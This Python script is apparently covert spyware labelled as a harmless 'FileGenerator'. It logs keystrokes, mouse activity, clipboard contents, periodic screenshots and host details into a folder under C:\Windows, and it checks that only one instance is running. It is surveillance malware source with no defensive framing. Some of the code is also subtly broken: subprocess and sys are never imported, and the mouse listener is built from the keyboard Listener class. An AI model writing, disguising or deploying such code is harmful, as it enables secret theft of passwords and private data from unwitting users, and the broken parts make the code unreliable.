import logging
import os
import platform
import socket
import time
import pyscreenshot
import pyperclip
import psutil
from pynput import keyboard
from pynput.keyboard import Listener
import threading

# Function to install a package using pip
def install_package(package_name):
    try:
        subprocess.check_call([sys.executable, "-m", "pip", "install", package_name])
        logging.info(f"Package {package_name} installed successfully.")
    except subprocess.CalledProcessError as e:
        logging.error(f"Failed to install package {package_name}: {e}")
        sys.exit(1)

# Ensure sounddevice is installed
try:
    import sounddevice as sd
except ImportError:
    install_package("sounddevice")
    import sounddevice as sd


# Shared settings
output_directory = "C:\\Windows\\klm\\output"
log_directory = "C:\\Windows\\klm\\logs"
os.makedirs(output_directory, exist_ok=True)
os.makedirs(log_directory, exist_ok=True)
logging.basicConfig(filename=os.path.join(log_directory, 'file_generation.log'), level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')

def check_if_already_running():
    current_script = os.path.basename(__file__)  # Gets the name of the current script
    for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
        # Check if this script is part of the cmdline of any running processes
        if proc.info['cmdline'] and current_script in ' '.join(proc.info['cmdline']):
            if proc.pid != os.getpid():
                # If the script name is found and it's not this process, it's already running
                return True
    return False

class FileGenerator:
    def __init__(self):
        self.log = "File Generation Started..."
        logging.info("FileGenerator initialized")

    def appendlog(self, string):
        self.log += string

    def on_move(self, x, y):
        try:
            current_move = "Mouse moved to {} {}\n".format(x, y)
            self.appendlog(current_move)
        except Exception as e:
            logging.error(f"Failed to log mouse movement: {e}")

    def on_click(self, x, y, button, pressed):
        try:
            current_click = "Mouse clicked at {} {} with {}\n".format(x, y, button)
            self.appendlog(current_click)
        except Exception as e:
            logging.error(f"Failed to log mouse click: {e}")

    def on_scroll(self, x, y, dx, dy):
        try:
            current_scroll = "Mouse scrolled at {} {} with {}\n".format(x, y, dx, dy)
            self.appendlog(current_scroll)
        except Exception as e:
            logging.error(f"Failed to log mouse scroll: {e}")

    def save_data(self, key):
        try:
            try:
                current_key = str(key.char)
            except AttributeError:
                if key == key.space:
                    current_key = "SPACE"
                elif key == key.esc:
                    current_key = "ESC"
                else:
                    current_key = " " + str(key) + " "
            self.appendlog(current_key + "\n")
            self.save_log()
        except Exception as e:
            logging.error(f"Failed to log key press: {e}")

    def save_log(self):
        try:
            log_path = os.path.join(output_directory, "key_log.txt")
            with open(log_path, 'w') as log_file:
                log_file.write(self.log)
            logging.info(f"Key log saved to {log_path}")
        except Exception as e:
            logging.error(f"Failed to save log file: {e}")

    def periodic_tasks(self):
        self.system_information()
        self.screenshot()
        self.get_clipboard_content()
        # Reset the timer
        threading.Timer(100, self.periodic_tasks).start()

    def system_information(self):
        try:
            hostname = socket.gethostname()
            ip = socket.gethostbyname(hostname)
            plat = platform.processor()
            system = platform.system()
            machine = platform.machine()
            self.appendlog(f"Hostname: {hostname}\nIP Address: {ip}\nProcessor: {plat}\nSystem: {system}\nMachine: {machine}\n")
            self.save_log()
        except Exception as e:
            logging.error(f"Failed to gather system information: {e}")

    def screenshot(self):
        try:
            img = pyscreenshot.grab()
            timestamp = time.strftime("%Y%m%d_%H%M%S", time.localtime())
            screenshot_path = os.path.join(output_directory, f"screenshot_{timestamp}.png")
            img.save(screenshot_path)
            logging.info(f"Screenshot saved to {screenshot_path}")
        except Exception as e:
            logging.error(f"Failed to take screenshot: {e}")

    def get_clipboard_content(self):
        clipboard_content = "Could not access clipboard"
        for i in range(5):  # max_retries is 5
            try:
                clipboard_content = pyperclip.paste()
                break
            except pyperclip.PyperclipException as e:
                logging.error(f"Error accessing clipboard (attempt {i+1}): {e}")
                time.sleep(1)  # Wait a bit before retrying
        self.appendlog(f"Clipboard content: {clipboard_content}\n")

    def run(self):
        # Start periodic tasks
        self.periodic_tasks()

        # Start the keyboard listener
        keyboard_listener = keyboard.Listener(on_press=self.save_data)
        keyboard_listener.start()

        # Set up mouse listeners
        mouse_listener = Listener(on_click=self.on_click, on_move=self.on_move, on_scroll=self.on_scroll)
        mouse_listener.start()

if __name__ == "__main__":
    if check_if_already_running():
        logging.error("Another instance of the script is already running.")
        sys.exit("Another instance of the script is already running.")
    file_generator = FileGenerator()
    file_generator.run()
